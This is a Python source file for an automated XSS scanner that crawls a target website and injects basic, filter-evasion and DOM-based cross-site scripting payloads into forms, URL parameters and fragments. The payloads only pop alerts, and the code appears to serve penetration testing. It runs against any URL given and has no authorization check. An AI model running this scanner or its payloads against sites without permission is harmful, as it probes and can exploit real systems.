import requests
import re
import logging
import random
import time
import json
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs, urljoin
import string
import concurrent.futures
import threading


class XSSScanner:
    """Tool for scanning websites for Cross-Site Scripting (XSS) vulnerabilities."""
    
    def __init__(self):
        # Set user agent for requests
        self.user_agent = "Cypher-Security-Toolkit/1.0"
        
        # Default request timeout
        self.timeout = 10
        
        # Default max number of concurrent requests
        self.max_threads = 10
        
        # Standard payloads for testing
        self.basic_payloads = [
            '<script>alert("XSS")</script>',
            '<img src="x" onerror="alert(\'XSS\')">',
            '<svg onload="alert(\'XSS\')"/>',
            '"><script>alert("XSS")</script>',
            '\'><script>alert("XSS")</script>',
            'javascript:alert("XSS")',
            '<body onload="alert(\'XSS\')">',
            '<img src="javascript:alert(\'XSS\');">',
            '<iframe src="javascript:alert(\'XSS\');"></iframe>',
            '"><img src=x onerror=confirm("XSS")>',
            '"><svg/onload=alert("XSS")>'
        ]
        
        # More advanced payloads for testing evasion techniques
        self.advanced_payloads = [
            '<scr<script>ipt>alert("XSS")</scr<script>ipt>',
            '<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">',
            '<svg><script>alert&#40;1&#41;</script>',
            '<SCRIPT SRC=data:text/javascript,alert("XSS")></SCRIPT>',
            '<iframe/src="data:text/html,<svg onload=alert(\'XSS\')>">',
            '"><img src=x onerror=prompt(document.domain)>',
            '<img/src="data:image/svg+xml,<svg onload=alert(\'XSS\')>">',
            '<a href="javascript\x3Aalert(\'XSS\')">Click me</a>',
            '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+">Click me</a>',
            '<div style="background-image:url(javascript:alert(\'XSS\'))">',
            '<div style="width:expression(alert(\'XSS\'))">',
            '<img src=1 href=1 onerror="javascript:alert(\'XSS\')"></img>'
        ]
        
        # DOM-based XSS payloads
        self.dom_payloads = [
            '#<script>alert("XSS")</script>',
            '#<img src="x" onerror="alert(\'XSS\')">',
            '#javascript:alert("XSS")',
            '?name=<script>alert("XSS")</script>',
            '?q=<img src=x onerror=alert("XSS")>',
            '#<svg onload=alert("XSS")>'
        ]
        
        # Scanner state
        self.scanning = False
        self.stop_requested = False
        self.lock = threading.Lock()
        self.results = []
    
    def scan(self, url, scan_level='basic', max_urls=50, headers=None, cookies=None, forms=True, parameters=True, dom=True, callback=None):
        """
        Scan a website for XSS vulnerabilities.
        
        Args:
            url: Target website URL
            scan_level: Scan level ('basic', 'advanced', 'full')
            max_urls: Maximum number of URLs to scan
            headers: Custom HTTP headers to include
            cookies: Cookies to include with requests
            forms: Whether to scan forms
            parameters: Whether to scan URL parameters
            dom: Whether to check for DOM-based XSS
            callback: Optional callback function for progress updates
            
        Returns:
            Dictionary with scan results
        """
        if self.scanning:
            return {"error": "Scan already in progress. Stop the current scan before starting a new one."}
        
        # Reset state
        self.scanning = True
        self.stop_requested = False
        self.results = []
        
        # Set custom headers
        request_headers = {
            'User-Agent': self.user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0'
        }
        
        if headers:
            request_headers.update(headers)
        
        # Validate and normalize the URL
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        
        try:
            # Phase 1: Crawl the website and collect URLs, forms, and parameters
            crawl_results = self._crawl_website(url, max_urls, request_headers, cookies, callback)
            
            if self.stop_requested:
                return self._scan_completed(callback, "Scan stopped by user request during crawling phase.")
            
            # Get payloads based on scan level
            if scan_level == 'basic':
                payloads = self.basic_payloads
            elif scan_level == 'advanced':
                payloads = self.basic_payloads + self.advanced_payloads
            else:  # 'full'
                payloads = self.basic_payloads + self.advanced_payloads + self.dom_payloads
            
            # Phase 2: Test forms if enabled
            if forms and crawl_results['forms']:
                if callback:
                    callback({
                        'status': 'in_progress',
                        'message': f"Testing {len(crawl_results['forms'])} forms for XSS vulnerabilities...",
                        'progress': 30
                    })
                
                self._test_forms(crawl_results['forms'], payloads, request_headers, cookies, callback)
                
                if self.stop_requested:
                    return self._scan_completed(callback, "Scan stopped by user request during form testing phase.")
            
            # Phase 3: Test URL parameters if enabled
            if parameters and crawl_results['parameters']:
                if callback:
                    callback({
                        'status': 'in_progress',
                        'message': f"Testing {len(crawl_results['parameters'])} URL parameters for XSS vulnerabilities...",
                        'progress': 60
                    })
                
                self._test_parameters(crawl_results['parameters'], payloads, request_headers, cookies, callback)
                
                if self.stop_requested:
                    return self._scan_completed(callback, "Scan stopped by user request during parameter testing phase.")
            
            # Phase 4: Test for DOM-based XSS if enabled
            if dom and crawl_results['urls']:
                if callback:
                    callback({
                        'status': 'in_progress',
                        'message': "Testing for DOM-based XSS vulnerabilities...",
                        'progress': 80
                    })
                
                self._test_dom_xss(crawl_results['urls'], self.dom_payloads, request_headers, cookies, callback)
                
                if self.stop_requested:
                    return self._scan_completed(callback, "Scan stopped by user request during DOM XSS testing phase.")
            
            # Scan completed successfully
            return self._scan_completed(callback, "Scan completed successfully.")
            
        except Exception as e:
            self.scanning = False
            error_message = f"Error during scan: {str(e)}"
            
            if callback:
                callback({
                    'status': 'error',
                    'message': error_message
                })
            
            return {
                'status': 'error',
                'message': error_message,
                'results': self.results
            }
    
    def stop(self):
        """Stop an ongoing scan."""
        if not self.scanning:
            return {"status": "not_scanning"}
        
        self.stop_requested = True
        return {"status": "stopping"}
    
    def _crawl_website(self, base_url, max_urls, headers, cookies, callback):
        """
        Crawl the website to find URLs, forms, and parameters.
        
        Args:
            base_url: Base URL to start crawling from
            max_urls: Maximum number of URLs to crawl
            headers: HTTP headers to use
            cookies: Cookies to use
            callback: Progress callback function
            
        Returns:
            Dictionary with discovered URLs, forms, and parameters
        """
        if callback:
            callback({
                'status': 'in_progress',
                'message': "Crawling website to discover URLs, forms, and parameters...",
                'progress': 10
            })
        
        # URLs to crawl (queue)
        urls_to_crawl = [base_url]
        
        # URLs already crawled (to avoid duplicates)
        crawled_urls = set()
        
        # Results
        discovered_urls = []
        discovered_forms = []
        discovered_parameters = []
        
        # Extract domain from base_url
        base_domain = urlparse(base_url).netloc
        
        # Start crawling
        while urls_to_crawl and len(crawled_urls) < max_urls and not self.stop_requested:
            # Get next URL to crawl
            current_url = urls_to_crawl.pop(0)
            
            # Skip if already crawled
            if current_url in crawled_urls:
                continue
            
            try:
                # Make the request
                response = requests.get(
                    current_url, 
                    headers=headers, 
                    cookies=cookies, 
                    timeout=self.timeout,
                    allow_redirects=True
                )
                
                # Skip non-HTML responses
                content_type = response.headers.get('Content-Type', '').lower()
                if 'text/html' not in content_type:
                    continue
                
                # Mark as crawled
                crawled_urls.add(current_url)
                discovered_urls.append(current_url)
                
                # Parse the HTML
                soup = BeautifulSoup(response.text, 'html.parser')
                
                # Find all links
                for link in soup.find_all('a', href=True):
                    href = link['href']
                    
                    # Skip empty or JavaScript hrefs
                    if not href or href.startswith(('javascript:', '#', 'mailto:')):
                        continue
                    
                    # Convert relative URLs to absolute
                    absolute_url = urljoin(current_url, href)
                    
                    # Skip external domains
                    if urlparse(absolute_url).netloc != base_domain:
                        continue
                    
                    # Add to queue if not already crawled
                    if absolute_url not in crawled_urls and absolute_url not in urls_to_crawl:
                        urls_to_crawl.append(absolute_url)
                
                # Find all forms
                for form in soup.find_all('form'):
                    form_action = form.get('action', '')
                    form_method = form.get('method', 'get').lower()
                    
                    # Convert relative URLs to absolute
                    form_action = urljoin(current_url, form_action)
                    
                    # Skip external domains
                    if urlparse(form_action).netloc != base_domain:
                        continue
                    
                    # Get form inputs
                    inputs = []
                    for input_field in form.find_all(['input', 'textarea']):
                        input_type = input_field.get('type', '').lower()
                        input_name = input_field.get('name', '')
                        input_value = input_field.get('value', '')
                        
                        # Skip submit, button, hidden, and password inputs
                        if input_type in ['submit', 'button', 'hidden', 'password']:
                            continue
                        
                        # Skip inputs without a name
                        if not input_name:
                            continue
                        
                        inputs.append({
                            'name': input_name,
                            'value': input_value,
                            'type': input_type
                        })
                    
                    # Skip forms without inputs
                    if not inputs:
                        continue
                    
                    discovered_forms.append({
                        'url': current_url,
                        'action': form_action,
                        'method': form_method,
                        'inputs': inputs
                    })
                
                # Find URL parameters
                parsed_url = urlparse(current_url)
                if parsed_url.query:
                    params = parse_qs(parsed_url.query)
                    
                    for param_name, param_values in params.items():
                        discovered_parameters.append({
                            'url': current_url,
                            'name': param_name,
                            'value': param_values[0] if param_values else ''
                        })
                
                # Update progress
                if callback and len(discovered_urls) % 5 == 0:
                    progress_percentage = min(29, 10 + int((len(discovered_urls) / max_urls) * 20))
                    callback({
                        'status': 'in_progress',
                        'message': f"Crawled {len(discovered_urls)} URLs, found {len(discovered_forms)} forms and {len(discovered_parameters)} parameters...",
                        'progress': progress_percentage
                    })
                
            except requests.RequestException:
                # Skip URLs that can't be accessed
                continue
        
        return {
            'urls': discovered_urls,
            'forms': discovered_forms,
            'parameters': discovered_parameters
        }
    
    def _test_forms(self, forms, payloads, headers, cookies, callback):
        """
        Test forms for XSS vulnerabilities.
        
        Args:
            forms: List of forms to test
            payloads: XSS payloads to use
            headers: HTTP headers to use
            cookies: Cookies to use
            callback: Progress callback function
        """
        # Use ThreadPoolExecutor for concurrent testing
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            # Submit tasks for each form and payload combination
            future_to_test = {}
            
            for form in forms:
                if self.stop_requested:
                    break
                
                for payload in payloads:
                    if self.stop_requested:
                        break
                    
                    # Create a unique signature for this test
                    signature = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
                    tagged_payload = payload.replace('XSS', f'XSS_{signature}')
                    
                    future = executor.submit(
                        self._test_form_with_payload,
                        form,
                        tagged_payload,
                        signature,
                        headers,
                        cookies
                    )
                    
                    future_to_test[future] = {
                        'form': form,
                        'payload': payload,
                        'signature': signature
                    }
            
            # Process completed futures
            completed = 0
            total = len(future_to_test)
            
            for future in concurrent.futures.as_completed(future_to_test):
                if self.stop_requested:
                    break
                
                test_info = future_to_test[future]
                
                try:
                    # Get the result (True if vulnerable, False otherwise)
                    is_vulnerable = future.result()
                    
                    if is_vulnerable:
                        # Add to results if vulnerable
                        self._add_result(
                            "Form",
                            test_info['form']['url'],
                            test_info['form']['action'],
                            "POST" if test_info['form']['method'] == 'post' else "GET",
                            [input_field['name'] for input_field in test_info['form']['inputs']],
                            test_info['payload']
                        )
                
                except Exception:
                    # Ignore exceptions during testing
                    pass
                
                # Update progress
                completed += 1
                if callback and completed % max(1, total // 10) == 0:
                    progress_percentage = min(59, 30 + int((completed / total) * 30))
                    callback({
                        'status': 'in_progress',
                        'message': f"Testing forms: {completed}/{total} completed...",
                        'progress': progress_percentage
                    })
    
    def _test_form_with_payload(self, form, payload, signature, headers, cookies):
        """
        Test a single form with a specific payload.
        
        Args:
            form: Form to test
            payload: XSS payload to use
            signature: Unique signature for this test
            headers: HTTP headers to use
            cookies: Cookies to use
            
        Returns:
            Boolean indicating if the form is vulnerable
        """
        try:
            # Prepare form data
            data = {}
            for input_field in form['inputs']:
                data[input_field['name']] = payload
            
            # Make the request
            if form['method'] == 'post':
                response = requests.post(
                    form['action'],
                    data=data,
                    headers=headers,
                    cookies=cookies,
                    timeout=self.timeout,
                    allow_redirects=True
                )
            else:
                response = requests.get(
                    form['action'],
                    params=data,
                    headers=headers,
                    cookies=cookies,
                    timeout=self.timeout,
                    allow_redirects=True
                )
            
            # Check if the payload is reflected
            return signature in response.text
            
        except requests.RequestException:
            # Not vulnerable if request fails
            return False
    
    def _test_parameters(self, parameters, payloads, headers, cookies, callback):
        """
        Test URL parameters for XSS vulnerabilities.
        
        Args:
            parameters: List of parameters to test
            payloads: XSS payloads to use
            headers: HTTP headers to use
            cookies: Cookies to use
            callback: Progress callback function
        """
        # Use ThreadPoolExecutor for concurrent testing
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            # Submit tasks for each parameter and payload combination
            future_to_test = {}
            
            for param in parameters:
                if self.stop_requested:
                    break
                
                for payload in payloads:
                    if self.stop_requested:
                        break
                    
                    # Create a unique signature for this test
                    signature = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
                    tagged_payload = payload.replace('XSS', f'XSS_{signature}')
                    
                    future = executor.submit(
                        self._test_parameter_with_payload,
                        param,
                        tagged_payload,
                        signature,
                        headers,
                        cookies
                    )
                    
                    future_to_test[future] = {
                        'parameter': param,
                        'payload': payload,
                        'signature': signature
                    }
            
            # Process completed futures
            completed = 0
            total = len(future_to_test)
            
            for future in concurrent.futures.as_completed(future_to_test):
                if self.stop_requested:
                    break
                
                test_info = future_to_test[future]
                
                try:
                    # Get the result (True if vulnerable, False otherwise)
                    is_vulnerable = future.result()
                    
                    if is_vulnerable:
                        # Add to results if vulnerable
                        self._add_result(
                            "URL Parameter",
                            test_info['parameter']['url'],
                            test_info['parameter']['url'],
                            "GET",
                            [test_info['parameter']['name']],
                            test_info['payload']
                        )
                
                except Exception:
                    # Ignore exceptions during testing
                    pass
                
                # Update progress
                completed += 1
                if callback and completed % max(1, total // 10) == 0:
                    progress_percentage = min(79, 60 + int((completed / total) * 20))
                    callback({
                        'status': 'in_progress',
                        'message': f"Testing parameters: {completed}/{total} completed...",
                        'progress': progress_percentage
                    })
    
    def _test_parameter_with_payload(self, param, payload, signature, headers, cookies):
        """
        Test a single parameter with a specific payload.
        
        Args:
            param: Parameter to test
            payload: XSS payload to use
            signature: Unique signature for this test
            headers: HTTP headers to use
            cookies: Cookies to use
            
        Returns:
            Boolean indicating if the parameter is vulnerable
        """
        try:
            # Parse the URL
            parsed_url = urlparse(param['url'])
            
            # Get existing parameters
            params = parse_qs(parsed_url.query)
            
            # Clone the parameters and add the payload
            test_params = {}
            for key, values in params.items():
                if key == param['name']:
                    test_params[key] = payload
                else:
                    test_params[key] = values[0] if values else ''
            
            # Build the test URL
            test_url = parsed_url.scheme + '://' + parsed_url.netloc + parsed_url.path
            
            # Make the request
            response = requests.get(
                test_url,
                params=test_params,
                headers=headers,
                cookies=cookies,
                timeout=self.timeout,
                allow_redirects=True
            )
            
            # Check if the payload is reflected
            return signature in response.text
            
        except requests.RequestException:
            # Not vulnerable if request fails
            return False
    
    def _test_dom_xss(self, urls, payloads, headers, cookies, callback):
        """
        Test for DOM-based XSS vulnerabilities.
        
        Args:
            urls: List of URLs to test
            payloads: XSS payloads to use
            headers: HTTP headers to use
            cookies: Cookies to use
            callback: Progress callback function
        """
        # Use ThreadPoolExecutor for concurrent testing
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            # Submit tasks for each URL and payload combination
            future_to_test = {}
            
            for url in urls:
                if self.stop_requested:
                    break
                
                for payload in payloads:
                    if self.stop_requested:
                        break
                    
                    # Create a unique signature for this test
                    signature = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
                    tagged_payload = payload.replace('XSS', f'XSS_{signature}')
                    
                    future = executor.submit(
                        self._test_dom_with_payload,
                        url,
                        tagged_payload,
                        signature,
                        headers,
                        cookies
                    )
                    
                    future_to_test[future] = {
                        'url': url,
                        'payload': payload,
                        'signature': signature
                    }
            
            # Process completed futures
            completed = 0
            total = len(future_to_test)
            
            for future in concurrent.futures.as_completed(future_to_test):
                if self.stop_requested:
                    break
                
                test_info = future_to_test[future]
                
                try:
                    # Get the result (True if vulnerable, False otherwise)
                    is_vulnerable = future.result()
                    
                    if is_vulnerable:
                        # Add to results if vulnerable
                        self._add_result(
                            "DOM",
                            test_info['url'],
                            test_info['url'] + test_info['payload'],
                            "GET",
                            ["fragment"] if '#' in test_info['payload'] else ["query"],
                            test_info['payload']
                        )
                
                except Exception:
                    # Ignore exceptions during testing
                    pass
                
                # Update progress
                completed += 1
                if callback and completed % max(1, total // 10) == 0:
                    progress_percentage = min(99, 80 + int((completed / total) * 19))
                    callback({
                        'status': 'in_progress',
                        'message': f"Testing DOM XSS: {completed}/{total} completed...",
                        'progress': progress_percentage
                    })
    
    def _test_dom_with_payload(self, url, payload, signature, headers, cookies):
        """
        Test for DOM-based XSS with a specific payload.
        
        Args:
            url: URL to test
            payload: XSS payload to use
            signature: Unique signature for this test
            headers: HTTP headers to use
            cookies: Cookies to use
            
        Returns:
            Boolean indicating if the URL is vulnerable
        """
        try:
            # Prepare the test URL
            test_url = url
            if '#' in payload:
                # Payload targets the URL fragment
                test_url += payload
            elif '?' in payload:
                # Payload targets URL parameters
                if '?' in test_url:
                    test_url += '&' + payload[1:]
                else:
                    test_url += payload
            else:
                # Just append the payload
                test_url += payload
            
            # Make the request
            response = requests.get(
                test_url,
                headers=headers,
                cookies=cookies,
                timeout=self.timeout,
                allow_redirects=True
            )
            
            # Check if the page is vulnerable by looking for our signature in scripts or event handlers
            # This is a simplified check and may miss some cases
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Check script tags
            for script in soup.find_all('script'):
                if script.string and signature in script.string:
                    return True
            
            # Check for event handlers containing our signature
            for tag in soup.find_all():
                for attr in tag.attrs:
                    if isinstance(tag.attrs[attr], str) and (attr.startswith('on') or 'javascript:' in tag.attrs[attr]):
                        if signature in tag.attrs[attr]:
                            return True
            
            return False
            
        except requests.RequestException:
            # Not vulnerable if request fails
            return False
    
    def _add_result(self, vuln_type, url, test_url, method, parameters, payload):
        """
        Add a vulnerability result to the results list.
        
        Args:
            vuln_type: Type of vulnerability (Form, URL Parameter, DOM)
            url: Original URL
            test_url: URL that was tested
            method: HTTP method used
            parameters: Affected parameters
            payload: XSS payload used
        """
        with self.lock:
            self.results.append({
                'type': vuln_type,
                'url': url,
                'test_url': test_url,
                'method': method,
                'parameters': parameters,
                'payload': payload,
                'timestamp': time.time()
            })
    
    def _scan_completed(self, callback, message):
        """
        Finalize the scan and return results.
        
        Args:
            callback: Progress callback function
            message: Completion message
            
        Returns:
            Dictionary with scan results
        """
        self.scanning = False
        
        # Sort results by URL
        sorted_results = sorted(self.results, key=lambda x: x['url'])
        
        # Group results by URL
        grouped_results = {}
        for result in sorted_results:
            url = result['url']
            if url not in grouped_results:
                grouped_results[url] = []
            grouped_results[url].append(result)
        
        # Final result
        final_result = {
            'status': 'completed',
            'message': message,
            'vulnerability_count': len(sorted_results),
            'vulnerable_urls': len(grouped_results),
            'results': sorted_results,
            'grouped_results': grouped_results
        }
        
        # Call the callback with the final result
        if callback:
            callback({
                'status': 'completed',
                'message': message,
                'progress': 100,
                'vulnerability_count': len(sorted_results),
                'vulnerable_urls': len(grouped_results)
            })
        
        return final_result